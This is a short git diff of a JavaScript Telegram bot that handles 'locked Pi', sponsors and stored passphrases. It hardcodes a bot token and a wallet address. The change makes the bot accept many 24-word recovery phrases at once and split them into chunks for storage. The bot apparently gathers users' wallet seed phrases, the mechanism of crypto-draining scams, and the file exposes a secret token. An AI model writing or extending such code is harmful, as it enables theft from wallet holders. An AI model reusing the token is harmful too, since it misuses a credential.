@@ -4,7 +4,7 @@ import { storeLockedPi, storeSponsor } from "./utils/modelfn.js";
 import { connectToDB } from "./db.js";
 import Sponsors from "./models/Sponsors.js";
 import Passphrase from "./models/Passphrase.js";
-import { formatReadableTimeString, splitMessage, timeAgoOrInString } from "./utils/helper.js";
+import { chunkArray, formatReadableTimeString, splitMessage, timeAgoOrInString } from "./utils/helper.js";
 
 const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
 const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
@@ -310,10 +310,11 @@ bot.on('message', async (msg) => {
     const text = msg.text.trim();
 
     if(userSessions[chatId]?.waitingForChunkPassphrase) {
-        const words = text
+        const parts = text
             .trim()
-            .split(/\s+/)
-            .slice(0, 24);
+            .split(/\s+/);
+
+        const words = chunkArray(parts, 24)
 
         console.log(words)
         console.log(words.length)
